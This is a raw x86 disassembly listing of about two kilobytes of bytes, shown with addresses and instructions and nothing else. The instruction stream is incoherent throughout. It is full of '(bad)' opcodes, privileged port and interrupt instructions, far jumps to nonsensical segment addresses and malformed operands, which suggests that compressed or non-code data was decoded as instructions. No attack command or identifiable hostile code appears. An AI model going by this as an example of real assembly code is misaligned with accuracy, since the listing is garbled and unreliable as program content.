  4222e4:	scas   eax,DWORD PTR es:[edi]
  4222e5:	push   ebx
  4222e6:	mov    ebx,0x572cc8e2
  4222eb:	test   BYTE PTR [eax],bl
  4222ed:	push   ds
  4222ee:	cdq    
  4222ef:	shr    DWORD PTR [ebx],0x82
  4222f2:	cs push 0xbce07936
  4222f8:	(bad)  
  4222fa:	xchg   edi,eax
  4222fb:	xchg   ebp,eax
  4222fc:	mov    ah,0xf8
  4222fe:	mov    WORD PTR [edx-0x24393ace],ds
  422304:	pusha  
  422305:	jmp    0xabfd967d
  42230a:	scas   al,BYTE PTR es:[edi]
  42230b:	jecxz  0x422373
  42230d:	and    ch,BYTE PTR [ecx+ebp*4+0x50]
  422311:	inc    esp
  422312:	sub    edi,DWORD PTR [esi+0x5282aa25]
  422318:	xor    eax,0xa485acb
  42231d:	scas   al,BYTE PTR es:[edi]
  42231e:	retf   
  42231f:	inc    ecx
  422320:	xchg   edi,eax
  422321:	test   BYTE PTR [ebx],ah
  422323:	out    0xb3,eax
  422325:	fmul   QWORD PTR [ebp+0x1d]
  422328:	push   esp
  422329:	adc    al,0x83
  42232b:	cld    
  42232c:	adc    BYTE PTR [esi],0xf2
  42232f:	jg     0x422370
  422331:	das    
  422332:	imul   ebp,DWORD PTR [ecx],0x9bd68688
  422338:	fiadd  DWORD PTR ds:[eax]
	...
  422347:	cmp    BYTE PTR [ebp+ebx*2-0x6b],al
  42234b:	jge    0x4222ea
  42234d:	clc    
  42234e:	in     eax,dx
  42234f:	add    DWORD PTR [ecx+0x4d3944ec],esp
  422355:	or     ecx,DWORD PTR [edi+0x67]
  422358:	lds    eax,FWORD PTR [ecx]
  42235a:	add    BYTE PTR [ebx],ch
  42235c:	add    al,BYTE PTR [eax]
  42235e:	add    bl,dl
  422360:	sbb    esi,esi
  422362:	aam    0xe4
  422364:	sub    al,0xe7
  422366:	repz inc edi
  422368:	aaa    
  422369:	sti    
  42236a:	repz not edx
  42236d:	ss xor ah,al
  422370:	bound  si,DWORD PTR [edx+0x6020e80f]
  422377:	les    ebx,FWORD PTR [edi+ebp*4]
  42237a:	jno    0x422375
  42237c:	inc    BYTE PTR [esi]
  42237e:	sbb    al,0x9c
  422380:	dec    edi
  422381:	call   0x564f:0xef59a2db
  422388:	bound  eax,QWORD PTR [edx]
  42238a:	sbb    al,bh
  42238c:	gs das 
  42238e:	mov    bl,0x71
  422390:	(bad)  
  422391:	out    dx,eax
  422392:	adc    BYTE PTR [eax+0x5260a018],bl
  422398:	popf   
  422399:	sub    BYTE PTR [edx+0x3b],0x91
  42239d:	jae    0x422354
  42239f:	dec    ecx
  4223a0:	add    eax,ebx
  4223a2:	xchg   ebx,eax
  4223a3:	inc    edx
  4223a4:	idiv   BYTE PTR ds:[esi-0x79]
  4223a8:	int    0xc8
  4223aa:	pminub mm1,mm2
  4223ad:	(bad)  
  4223ae:	inc    edi
  4223af:	jge    0x422397
  4223b1:	lds    ecx,FWORD PTR [esi]
  4223b3:	shl    BYTE PTR [edi+0x78],1
  4223b6:	cmp    edx,DWORD PTR [eax]
  4223b8:	jp     0x422401
  4223ba:	mov    cl,0x5
  4223bc:	bnd fs js 0x42236e
  4223c0:	fwait
  4223c1:	dec    edx
  4223c2:	dec    edx
  4223c3:	pop    esp
  4223c4:	stos   BYTE PTR es:[edi],al
  4223c5:	lock sbb BYTE PTR [ebp+0x20cc4def],cl
  4223cc:	mov    cl,0xac
  4223ce:	std    
  4223cf:	out    dx,eax
  4223d0:	and    BYTE PTR [edx-0x41563024],bh
  4223d6:	push   ecx
  4223d7:	(bad)  
  4223d8:	mov    eax,0xac3938ef
  4223dd:	test   DWORD PTR [eax],ebx
  4223df:	add    eax,edi
  4223e1:	add    al,0x5c
  4223e3:	sub    DWORD PTR [ebp-0xe444893],0xffffffcd
  4223ea:	cli    
  4223eb:	xchg   esp,eax
  4223ec:	stos   BYTE PTR es:[edi],al
  4223ed:	dec    ebp
  4223ee:	shl    DWORD PTR [eax],1
  4223f0:	mov    esi,0x63ecb1fd
  4223f5:	shl    DWORD PTR [ecx-0x30b72574],1
  4223fb:	and    dh,BYTE PTR [ebp+0x7c90fc4d]
  422401:	jle    0x42246e
  422403:	jmp    0x42238d
  422405:	inc    ebx
  422406:	in     eax,dx
  422407:	xchg   ecx,eax
  422408:	add    BYTE PTR [edx],ah
  42240a:	enter  0x932e,0xa4
  42240e:	cmp    eax,eax
  422410:	cmp    DWORD PTR [ebx],ebx
  422412:	cmp    eax,0x8889477e
  422417:	mov    dl,ch
  422419:	xor    eax,0x94125caa
  42241e:	fld    TBYTE PTR [ebp+0x69]
  422421:	dec    edx
  422422:	js     0x422470
  422424:	fabs   
  422426:	pop    esp
  422427:	shl    BYTE PTR [ecx+0x62],0x4c
  42242b:	cmp    eax,0x540f826c
  422430:	(bad)  
  422431:	fdivr  DWORD PTR [esi+ecx*8]
  422434:	(bad)  
  422435:	pop    eax
  422436:	int3   
  422437:	(bad)  
  422438:	jmp    0xd246da03
  42243d:	iret   
  42243e:	pusha  
  42243f:	xor    BYTE PTR ds:0xe4f0660,dl
  422445:	sub    ah,dl
  422447:	add    al,0xed
  422449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42244a:	lods   al,BYTE PTR ds:[esi]
  42244b:	mov    BYTE PTR [edx+eiz*4+0x62],al
  42244f:	cli    
  422450:	cs push ebp
  422452:	ficom  DWORD PTR [ecx-0x7b9c12b9]
  422458:	adc    BYTE PTR [esi-0x51909c47],0xb9
  42245f:	outs   dx,DWORD PTR ds:[esi]
  422460:	daa    
  422461:	sbb    ebx,DWORD PTR [esi]
  422463:	ror    BYTE PTR [esi-0x45],0xe9
  422467:	pop    ebx
  422468:	dec    esp
  422469:	sbb    eax,0x958e55ef
  42246e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42246f:	mov    esi,0x1f020c3c
  422474:	jae    0x422474
  422476:	enter  0xbf84,0x9f
  42247a:	jg     0x422468
  42247c:	and    eax,0xea3c807d
  422481:	adc    BYTE PTR [edx-0x3b],bh
  422484:	pop    ebp
  422485:	stos   BYTE PTR es:[edi],al
  422486:	shl    DWORD PTR [eax-0x57dec803],cl
  42248c:	inc    edx
  42248d:	xchg   DWORD PTR [edx+0x44],ecx
  422490:	imul   eax,DWORD PTR [edx-0x71f52ce1],0xffffffab
  422497:	xor    ebx,edi
  422499:	(bad)  
  42249a:	icebp  
  42249b:	(bad)  
  42249c:	les    edi,FWORD PTR [edi]
  42249e:	adc    BYTE PTR [ebx+eiz*1-0x7],ah
  4224a2:	mov    bh,0xf5
  4224a4:	pop    ebp
  4224a5:	sub    DWORD PTR [esi+0x158d3ea7],0x96bb0841
  4224af:	mul    BYTE PTR [edx]
  4224b1:	push   eax
  4224b2:	push   ss
  4224b3:	sar    DWORD PTR [edi-0x7d3ad5a4],0x13
  4224ba:	push   eax
  4224bb:	xchg   DWORD PTR [edx],eax
  4224bd:	enter  0xd2a4,0xd8
  4224c1:	shl    DWORD PTR [eax+0x78f290ad],1
  4224c7:	cdq    
  4224c8:	add    al,0x57
  4224ca:	(bad)  
  4224cb:	cld    
  4224cc:	arpl   WORD PTR [ebx+0x52],bp
  4224cf:	stos   BYTE PTR es:[edi],al
  4224d0:	clc    
  4224d1:	shl    cl,cl
  4224d3:	dec    edi
  4224d4:	sub    dl,ch
  4224d6:	push   cs
  4224d7:	pusha  
  4224d8:	into   
  4224d9:	adc    BYTE PTR [esi],bl
  4224db:	push   ecx
  4224dc:	jb     0x42254c
  4224de:	sub    edi,ebx
  4224e0:	mov    edx,0xc620bf9a
  4224e5:	rcl    DWORD PTR [edi],0x60
  4224e8:	add    DWORD PTR [ebp+0x3ab32cfd],ecx
  4224ee:	add    al,0xf2
  4224f0:	gs jns 0x422488
  4224f3:	dec    ecx
  4224f4:	out    0x6d,eax
  4224f6:	in     al,dx
  4224f7:	ds adc edi,ebx
  4224fa:	test   ch,0x87
  4224fd:	mov    al,ds:0x13fb82a7
  422502:	jo     0x422509
  422504:	(bad)  
  422505:	sub    BYTE PTR [esp+edi*8],0x53
  422509:	mov    edi,0x8743d994
  42250e:	pop    ds
  42250f:	inc    ebp
  422510:	and    edi,esp
  422512:	test   DWORD PTR [ecx+edi*8-0x12],edi
  422516:	pop    ebx
  422517:	loopne 0x4224b4
  422519:	jno    0x4224d1
  42251b:	lahf   
  42251c:	jle    0x4224fe
  42251e:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422520:	xor    eax,0x26ad4a8
  422525:	lods   al,BYTE PTR ds:[esi]
  422526:	adc    DWORD PTR [ebx-0x3d0c5254],0x5a
  42252d:	bswap  ebx
  42252f:	fidiv  WORD PTR [eax+0x50d9b396]
  422535:	jle    0x4224f5
  422537:	mov    eax,ds:0xc2ebce3f
  42253c:	int3   
  42253d:	ficom  DWORD PTR [edi]
  42253f:	inc    esi
  422540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422541:	mov    dl,0x31
  422543:	loopne 0x422508
  422545:	sbb    DWORD PTR [ecx+0x48],ecx
  422548:	leave  
  422549:	jg     0x422544
  42254b:	pop    esp
  42254c:	out    dx,eax
  42254d:	pop    edx
  42254e:	mov    cl,0xbf
  422550:	cmp    eax,0xa309d842
  422555:	xchg   dh,dl
  422557:	leave  
  422558:	pop    esp
  422559:	dec    ecx
  42255a:	cld    
  42255b:	retf   0x4d34
  42255e:	jae    0x42255c
  422560:	or     DWORD PTR [edi+0x57],ecx
  422563:	stos   DWORD PTR es:[edi],eax
  422564:	cwde   
  422565:	push   eax
  422566:	jmp    0x9e2d:0x5a15914a
  42256d:	in     eax,0x4d
  42256f:	mov    dh,0x7
  422571:	das    
  422572:	pop    ebp
  422573:	and    eax,0xeb280a33
  422578:	mov    eax,0x196be9c5
  42257d:	sbb    edx,0x3f
  422580:	jns    0x42250a
  422582:	adc    BYTE PTR [ebx-0x35782150],0xcf
  422589:	inc    ebx
	...
  422596:	add    BYTE PTR [eax-0x18f113c],dl
  42259c:	jp     0x42253c
  42259e:	in     al,0xf3
  4225a0:	fist   DWORD PTR [ecx+ebp*2]
  4225a3:	(bad)  
  4225a4:	test   BYTE PTR [ebp+ebx*8+0x1c792],bh
  4225ab:	sub    eax,DWORD PTR [edx]
  4225ad:	add    BYTE PTR [eax],al
  4225af:	ins    DWORD PTR es:[edi],dx
  4225b0:	jecxz  0x4225fc
  4225b2:	or     eax,0xddb1132c
  4225b7:	sub    ebx,DWORD PTR [eax]
  4225b9:	(bad)  
  4225ba:	fldcw  WORD PTR [esp+eax*8+0x53abc823]
  4225c1:	clc    
  4225c2:	push   eax
  4225c3:	dec    esp
  4225c4:	hlt    
  4225c5:	aam    0x6d
  4225c7:	push   ebx
  4225c8:	pop    es
  4225c9:	hlt    
  4225ca:	cmp    DWORD PTR [edx],edx
  4225cc:	dec    edi
  4225cd:	jne    0x4225d4
  4225cf:	test   eax,0x18a0f9d7
  4225d4:	jmp    0x2f93:0xd1585f9d
  4225db:	int    0xde
  4225dd:	mov    bh,0xa0
  4225df:	add    ebx,ecx
  4225e1:	cmp    BYTE PTR [ebx],dl
  4225e3:	inc    ecx
  4225e4:	inc    edi
  4225e5:	xchg   ebp,eax
  4225e6:	clc    
  4225e7:	and    DWORD PTR [ebp-0x295bac2a],esi
  4225ed:	in     eax,dx
  4225ee:	sbb    eax,0x67da37d0
  4225f3:	ins    BYTE PTR es:[edi],dx
  4225f4:	js     0x422633
  4225f6:	jnp    0x422597
  4225f8:	loope  0x42266f
  4225fa:	repz add DWORD PTR [edi],edx
  4225fd:	js     0x42263e
  4225ff:	shl    BYTE PTR [ecx],1
  422601:	cmp    al,0x16
  422603:	jp     0x422636
  422605:	dec    ebp
  422606:	(bad)  
  422607:	iret   
  422608:	push   0xae421bd3
  42260d:	test   eax,0x77527597
  422612:	inc    ecx
  422613:	pop    esi
  422614:	cld    
  422615:	aas    
  422616:	inc    edi
  422617:	mov    eax,fs:0xc2320ad1
  42261d:	xchg   esi,eax
  42261e:	stos   BYTE PTR es:[edi],al
  42261f:	dec    eax
  422620:	add    al,BYTE PTR [ecx-0x453f8dbb]
  422626:	mov    eax,0x3e8fad44
  42262b:	inc    edx
  42262c:	mov    al,ds:0xf0f558aa
  422631:	dec    esp
  422632:	mov    ?,WORD PTR [edx+0x26d345dd]
  422638:	stc    
  422639:	pop    ebx
  42263a:	retf   
  42263b:	or     eax,0x6e6e3137
  422640:	lea    eax,[ebx+0x2]
  422643:	jl     0x4225e3
  422645:	ret    0x77ef
  422648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422649:	mov    ebx,0xe28b2a28
  42264e:	xor    edi,DWORD PTR [edx]
  422650:	push   0x27
  422652:	ds inc ecx
  422654:	sub    DWORD PTR [edx+0x32],esi
  422657:	mov    DWORD PTR ds:0x7044ba7c,ecx
  42265d:	ret    0x4e4f
  422660:	push   edx
  422661:	push   edx
  422662:	imul   ebx,DWORD PTR [edx-0x7cf9fb06],0x2930ff66
  42266c:	rcl    DWORD PTR [esp+ebp*4+0x9386198],0x89
  422674:	nop    edx
  422677:	add    ebx,DWORD PTR [ebx-0x7a07faf6]
  42267d:	dec    edx
  42267e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42267f:	cdq    
  422680:	pop    ecx
  422681:	call   0x811d9f69
  422686:	aas    
  422687:	push   0x11
  422689:	push   cs
  42268a:	mov    ch,0xc4
  42268c:	hlt    
  42268d:	into   
  42268e:	out    0x13,eax
  422690:	fnstsw WORD PTR [ecx-0x4e]
  422693:	into   
  422694:	je     0x422701
  422696:	(bad)  
  422697:	mov    ah,0xb6
  422699:	sbb    eax,0x45a0fab4
  42269e:	push   ebp
  42269f:	push   0xfc191746
  4226a4:	mov    esi,0x6607bfb0
  4226a9:	lods   eax,DWORD PTR ds:[esi]
  4226aa:	ret    
  4226ab:	ins    DWORD PTR es:[edi],dx
  4226ac:	mov    eax,ds:0x9527b21a
  4226b1:	lock scas al,BYTE PTR es:[edi]
  4226b3:	popf   
  4226b4:	dec    ecx
  4226b5:	mov    bh,0x3b
  4226b7:	adc    esp,DWORD PTR [ebp+edi*1+0x1c341163]
  4226be:	mov    ebx,0x7886551f
  4226c3:	push   0x7c76d7ea
  4226c8:	add    edi,DWORD PTR ds:0x5a486f39
  4226ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226cf:	fldcw  WORD PTR [ecx+0x46]
  4226d2:	(bad)  
  4226d3:	call   0x63a9:0x2a6f7fc6
  4226da:	mov    dh,0x5f
  4226dc:	xlat   BYTE PTR ds:[ebx]
  4226dd:	lods   eax,DWORD PTR ds:[esi]
  4226de:	cs cmc 
  4226e0:	shr    DWORD PTR [edi+0xb],1
  4226e3:	in     eax,0x78
  4226e5:	adc    dh,BYTE PTR [ebx-0x69299118]
  4226eb:	lods   al,BYTE PTR ds:[esi]
  4226ec:	mov    esp,DWORD PTR [eax]
  4226ee:	inc    ebp
  4226ef:	or     al,BYTE PTR [esp+edx*8-0x23]
  4226f3:	mov    ecx,0xcdcc7298
  4226f8:	popf   
  4226f9:	mov    al,ds:0x2939a214
  4226fe:	inc    eax
  4226ff:	and    al,0x85
  422701:	lahf   
  422702:	jl     0x422772
  422704:	adc    DWORD PTR [ebp-0x4ed96f9d],ebp
  42270a:	(bad)  
  42270b:	into   
  42270c:	cmp    dl,bh
  42270e:	dec    edx
  42270f:	ins    DWORD PTR es:[edi],dx
  422710:	mov    al,ds:0x234c0f6b
  422715:	push   0x16
  422717:	sub    al,al
  422719:	daa    
  42271a:	sbb    al,dl
  42271c:	sbb    al,0x2a
  42271e:	outs   dx,BYTE PTR ds:[esi]
  42271f:	fisttp QWORD PTR [ebx-0x1eece3a5]
  422725:	fimul  DWORD PTR [edi]
  422727:	mov    ecx,0x8ba960d6
  42272c:	into   
  42272d:	icebp  
  42272e:	jge    0x42270d
  422730:	push   ss
  422731:	out    0x7f,eax
  422733:	stos   DWORD PTR es:[edi],eax
  422734:	add    al,0x40
  422736:	mov    cs,WORD PTR [edx]
  422738:	popf   
  422739:	dec    ecx
  42273a:	and    eax,0xbbb9f306
  42273f:	(bad)  
  422740:	das    
  422741:	add    eax,0x2a431f07
  422746:	ja     0x4227b3
  422748:	test   DWORD PTR [edx],edi
  42274a:	xchg   edx,eax
  42274b:	and    eax,0x8e7c5b82
  422750:	push   0xffffffdf
  422752:	test   al,0x7a
  422754:	jl     0x42271b
  422756:	sbb    DWORD PTR [ecx-0x1e338c6e],esp
  42275c:	sub    eax,DWORD PTR [eax+ebx*8-0x3a67ee53]
  422763:	cmp    edi,esp
  422765:	inc    esp
  422766:	mov    dh,0x29
  422768:	dec    ecx
  422769:	outs   dx,DWORD PTR ds:[esi]
  42276a:	(bad)  
  42276b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42276c:	or     BYTE PTR [ecx],bh
  42276e:	push   ecx
  42276f:	ss dec esi
  422771:	and    eax,0x3ad546f8
  422776:	sar    BYTE PTR [ecx],0x2b
  422779:	imul   ecx,eax,0x5a
  42277c:	loopne 0x422749
  42277e:	sbb    DWORD PTR [edx+0x4f5e30e3],edi
  422784:	mov    dh,0xa
  422786:	or     BYTE PTR [edi-0x10],bh
  422789:	and    DWORD PTR [edx],0x42ff7c20
  42278f:	repz std 
  422791:	add    BYTE PTR [ebp-0x6f34effe],dh
  422797:	xchg   BYTE PTR [eax-0x61],bl
  42279a:	arpl   WORD PTR [ecx+0x21],ax
  42279d:	fmulp  st(6),st
  42279f:	fdiv   QWORD PTR [edi]
  4227a1:	cmc    
  4227a2:	mov    al,ds:0xee9efbdb
  4227a7:	mov    bl,0x7c
  4227a9:	out    dx,eax
  4227aa:	cmp    eax,0x1c475cc8
  4227af:	pop    es
  4227b0:	xchg   esi,eax
  4227b1:	imul   DWORD PTR [eax]
  4227b3:	jb     0x4227ad
  4227b5:	add    DWORD PTR [eax],edi
  4227b7:	loopne 0x42279f
  4227b9:	xor    ebp,DWORD PTR [eax]
  4227bb:	dec    esi
  4227bc:	cmp    ebx,DWORD PTR [ebx]
  4227be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227bf:	xchg   edi,eax
  4227c0:	aam    0x3f
  4227c2:	push   esp
  4227c3:	les    ecx,FWORD PTR [ebx-0x7c3a0d32]
  4227c9:	push   edx
  4227ca:	shl    BYTE PTR [ecx-0x76c6f323],0x6c
  4227d1:	dec    ebp
  4227d2:	rcl    BYTE PTR [esi+0x2c],1
  4227d5:	loope  0x422823
  4227d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227d8:	popa   
  4227d9:	pop    edi
	...
  4227e6:	add    BYTE PTR [ebp+0x3b6013b4],cl
  4227ec:	out    0xff,eax
  4227ee:	std    
  4227ef:	pushf  
  4227f0:	push   es
  4227f1:	or     BYTE PTR ds:0x91a61d39,0xbd
  4227f8:	leave  
  4227f9:	add    DWORD PTR [eax],eax
  4227fb:	sub    eax,DWORD PTR [edx]
  4227fd:	add    BYTE PTR [eax],al
  4227ff:	push   0x4002e1dc
  422804:	sub    dh,BYTE PTR [edi+0x5a8fc01b]
  42280a:	jge    0x4227d4
  42280c:	nop
  42280d:	cmp    cl,BYTE PTR [edi]
  42280f:	mov    eax,edi
  422811:	js     0x422863
  422813:	cdq    
  422814:	mov    ecx,0x511225b1
  422819:	(bad)  
  42281a:	xor    WORD PTR [ecx+0x396e0160],bx
  422821:	ins    DWORD PTR es:[edi],dx
  422822:	push   cs
  422823:	stc    
  422824:	out    0x9c,al
  422826:	retf   
  422827:	jle    0x422815
  422829:	add    DWORD PTR [esi],ecx
  42282b:	les    esp,FWORD PTR [edx]
  42282d:	fcom   QWORD PTR [ecx-0x12]
  422830:	inc    eax
  422831:	xchg   ecx,eax
  422832:	push   eax
  422833:	mov    bl,0xa9
  422835:	dec    edx
  422836:	adc    dh,BYTE PTR [ecx]
  422838:	xchg   esp,eax
  422839:	jmp    0xb4b1:0x395e66ac
  422840:	in     eax,dx
  422841:	push   edx
  422842:	push   ds
  422843:	xchg   esp,eax
  422844:	in     eax,0xe
  422846:	cmp    ebp,DWORD PTR [ecx+0x22]
  422849:	cmp    eax,0x7ec8a7b9
  42284e:	push   cs
  42284f:	(bad)  
  422850:	xor    esi,ebx
  422852:	add    DWORD PTR [edx-0x7cc15e57],edx
  422858:	jae    0x4227f3
  42285a:	xor    BYTE PTR [edx+0x70],0x8a
  42285e:	xchg   edx,eax
  42285f:	je     0x42288d
  422861:	fldcw  WORD PTR [esi-0x586a76d1]
  422867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422868:	enter  0x2229,0xa4
  42286c:	xor    eax,0xed793820
  422871:	dec    esp
  422872:	fucom  st(6)
  422874:	xchg   edi,eax
  422875:	push   edx
  422876:	addr16 shr bl,1
  422879:	xor    dh,BYTE PTR [edi-0x36]
  42287c:	cmp    DWORD PTR [ecx],eax
  42287e:	loope  0x422834
  422880:	lea    ebp,ds:0xf1d0cd45
  422886:	stos   DWORD PTR es:[edi],eax
  422887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422888:	cwde   
  422889:	aaa    
  42288a:	fs cmp ebx,ecx
  42288d:	dec    edi
  42288e:	bnd jns 0x422811
  422891:	cmp    esi,DWORD PTR [edi-0x75]
  422894:	fidiv  DWORD PTR [ebx+0x54]
  422897:	(bad)  
  422898:	call   0xb6070396
  42289d:	retf   
  42289e:	out    0x4,al
  4228a0:	jbe    0x422856
  4228a2:	jmp    0x5499:0xfe63da49
  4228a9:	js     0x42289b
  4228ab:	mov    dh,0x72
  4228ad:	xchg   esp,eax
  4228ae:	daa    
  4228af:	mov    cl,0xcf
  4228b1:	retf   
  4228b2:	push   0xbe7caa0e
  4228b7:	clc    
  4228b8:	test   eax,0x71dbb161
  4228bd:	cld    
  4228be:	mov    ah,0xc
  4228c0:	mul    DWORD PTR [edx-0x25]
  4228c3:	test   al,0x87
  4228c5:	cdq    
  4228c6:	ds mov dh,0xea
  4228c9:	rcr    DWORD PTR [esi+0x38],cl
  4228cc:	arpl   WORD PTR ds:0x6b36f436,dx
  4228d2:	mov    ah,0x68
  4228d4:	call   DWORD PTR [edx+eiz*4+0x5765ce5d]
  4228db:	(bad)  
  4228dc:	sub    al,0xe4
  4228de:	push   ds
  4228df:	add    eax,0x7d31ceae
  4228e4:	enter  0x322,0xfc
  4228e8:	ffree  st(1)
  4228ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228eb:	leave  
  4228ec:	icebp  
  4228ed:	hlt    
  4228ee:	fadd   QWORD PTR [ecx]
  4228f0:	and    eax,0xa7580b62
  4228f5:	mov    al,ds:0x55b21988
  4228fa:	(bad)  
  4228fb:	mov    esi,0xdcf4129f
  422900:	jo     0x42297f
  422902:	out    dx,al
  422903:	dec    esi
  422904:	(bad)  
  422905:	cmc    
  422906:	push   esp
  422907:	mov    esi,0x2cbda25d
  42290c:	adc    al,0x7
  42290e:	push   ss
  42290f:	ror    BYTE PTR [ebp+eax*1-0x22c11d36],0x68
  422917:	or     eax,0x3ff94c4e
  42291c:	data16 add al,0x36
  42291f:	or     esi,DWORD PTR [edi]
  422921:	jns    0x422979
  422923:	jno    0x422954
  422925:	pop    esp
  422926:	mov    fs,WORD PTR [eax+0x8f6bbba]
  42292c:	popaw  
  42292e:	cs out 0xc,al
  422931:	ins    BYTE PTR es:[edi],dx
  422932:	outs   dx,BYTE PTR ds:[esi]
  422933:	or     eax,DWORD PTR [edx-0xe0b9439]
  422939:	push   0x71
  42293b:	xchg   DWORD PTR [edi],ebx
  42293d:	fdiv   DWORD PTR [ebx+0x5627bfeb]
  422943:	cmp    eax,0xb59df6
  422948:	push   edi
  422949:	jmp    0x422927
  42294b:	shl    ebx,cl
  42294d:	cmp    DWORD PTR [edi],0xa0c87113
  422953:	cmp    DWORD PTR [esi-0x71e98671],ebx
  422959:	shr    edx,1
  42295b:	std    
  42295c:	loop   0x422906
  42295e:	into   
  42295f:	clc    
  422960:	lods   eax,DWORD PTR ds:[esi]
  422961:	push   ss
  422962:	cmp    BYTE PTR [edi+0x34],ch
  422965:	out    0xda,eax
  422967:	scas   al,BYTE PTR es:[edi]
  422968:	add    BYTE PTR [edx+0x44],ch
  42296b:	mov    ecx,0x38a2cdce
  422970:	mov    dh,0xc9
  422972:	ret    0x67b4
  422975:	mov    al,ds:0xa4c564a0
  42297a:	dec    edx
  42297b:	jmp    0x42298e
  42297d:	arpl   WORD PTR [edx-0x11],bp
  422980:	nop
  422981:	aam    0x74
  422983:	pop    esp
  422984:	sub    eax,0x48554852
  422989:	and    BYTE PTR [eax+0x3d6db07a],bh
  42298f:	xchg   edx,eax
  422990:	sub    DWORD PTR [ebx],esi
  422992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422993:	sti    
  422994:	popf   
  422995:	data16 fidivr WORD PTR [ecx+esi*1]
  422999:	shr    DWORD PTR [eax],cl
  42299b:	xchg   cl,ch
  42299d:	fldcw  WORD PTR [ecx+0x47]
  4229a0:	jnp    0x422944
  4229a2:	sbb    BYTE PTR ds:0xdeda449,cl
  4229a8:	adc    al,0xb5
  4229aa:	test   DWORD PTR [edi],eax
  4229ac:	sub    al,0xfc
  4229ae:	in     al,dx
  4229af:	(bad)  
  4229b0:	cmp    esp,esi
  4229b2:	cmp    al,0x1b
  4229b4:	jge    0x4229ab
  4229b6:	loop   0x422a21
  4229b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229b9:	popf   
  4229ba:	mov    eax,ds:0x77c09dca
  4229bf:	pop    ds
  4229c0:	sbb    eax,0x8fb5b910
  4229c5:	xchg   edi,eax
  4229c6:	mov    esp,DWORD PTR [ebx-0x2a]
  4229c9:	and    eax,DWORD PTR [ebx]
  4229cb:	sbb    al,0xd9
  4229cd:	repz call 0x15a55f9d
  4229d3:	xor    eax,0x6c0e3fa3
  4229d8:	mov    edi,0xb6597aa0
  4229dd:	fcom   QWORD PTR [edi+ecx*4]
  4229e0:	mov    DWORD PTR [ecx-0x1c],ecx
  4229e3:	pop    ebx
  4229e4:	pop    ebp
  4229e5:	out    0x1d,al
  4229e7:	xchg   ebx,eax
  4229e8:	jns    0x422a1b
  4229ea:	xchg   edi,eax
  4229eb:	pop    ss
  4229ec:	cmp    eax,0x26d94dee
  4229f1:	mov    eax,ds:0xef59450
  4229f6:	sub    ecx,DWORD PTR [ecx-0x16b4e932]
  4229fc:	retf   0x8ee
  4229ff:	or     eax,0x76
  422a02:	addr16 dec esi
  422a04:	popf   
  422a05:	mov    eax,DWORD PTR [edx-0x3a3326e1]
  422a0b:	and    al,0xe5
  422a0d:	ins    BYTE PTR es:[edi],dx
  422a0e:	cld    
  422a0f:	lods   al,BYTE PTR ds:[esi]
  422a10:	mov    BYTE PTR fs:[eax],0x91
  422a14:	fistp  QWORD PTR [ebp-0x77]
  422a17:	inc    edi
  422a18:	cld    
  422a19:	out    dx,al
  422a1a:	enter  0x9277,0xe2
  422a1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a1f:	or     BYTE PTR [edx-0x30ce13f0],bl
  422a25:	and    bh,ah
  422a27:	fdiv   QWORD PTR [ebx+edx*1+0x0]
	...
  422a36:	add    BYTE PTR [ebp-0x1e],bl
  422a39:	mov    ch,0x1f
  422a3b:	mov    edi,0xcae2ff5f
  422a40:	arpl   WORD PTR [ecx],dx
  422a42:	mov    db5,esp
  422a45:	mov    WORD PTR [ebp+0x1cbe8],es
  422a4b:	sub    eax,DWORD PTR [edx]
  422a4d:	add    BYTE PTR [eax],al
  422a4f:	pop    ebp
  422a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a51:	pop    ecx
  422a52:	push   esp
  422a53:	push   eax
  422a54:	stos   BYTE PTR es:[edi],al
  422a55:	daa    
  422a56:	adc    cl,ch
  422a58:	(bad)  
  422a59:	into   
  422a5a:	push   ss
  422a5b:	ret    0x9b9e
  422a5e:	(bad)  
  422a5f:	jo     0x422a26
  422a61:	mov    BYTE PTR [ecx-0x2e],bh
  422a64:	in     al,0xf7
  422a66:	mov    cl,0x9c
  422a68:	mov    edi,0x84487839
  422a6d:	aas    
  422a6e:	out    0xb5,al
  422a70:	xor    al,0xa0
  422a72:	pop    ebp
  422a73:	or     BYTE PTR [edi-0x280708b8],ah
  422a79:	aad    0xc1
  422a7b:	jo     0x422a4c
  422a7d:	and    bl,BYTE PTR [edi-0x24]
  422a80:	repnz mov al,0x9f
  422a83:	inc    edx
  422a84:	daa    
  422a85:	int3   
  422a86:	inc    edx
  422a87:	(bad)  
  422a88:	mov    esp,0xffa5558c
  422a8d:	mov    esi,0x1415fe35
  422a92:	out    dx,al
  422a93:	lods   al,BYTE PTR ds:[esi]
  422a94:	enter  0xe9f6,0x92
  422a98:	lods   eax,DWORD PTR ds:[esi]
  422a99:	retf   
  422a9a:	in     eax,dx
  422a9b:	cld    
  422a9c:	data16 fisttp DWORD PTR [edx+0x6c]
  422aa0:	data16 add ch,dh
  422aa3:	and    eax,0x6e1faafb
  422aa8:	mov    edi,0xce0a4126
  422aad:	and    DWORD PTR [edx-0xd],edx
  422ab0:	inc    ebp
  422ab1:	ins    DWORD PTR es:[edi],dx
  422ab2:	cwde   
  422ab3:	lock mov al,0x7
  422ab6:	and    eax,0x3386ab25
  422abb:	jo     0x422a95
  422abd:	sbb    esp,DWORD PTR [esi]
  422abf:	dec    esp
  422ac0:	xor    al,0xf4
  422ac2:	dec    esp
  422ac3:	pop    eax
  422ac4:	cmp    BYTE PTR [edi],ch
  422ac6:	xchg   bl,bl
  422ac8:	cmp    ecx,edx
  422aca:	pop    ss
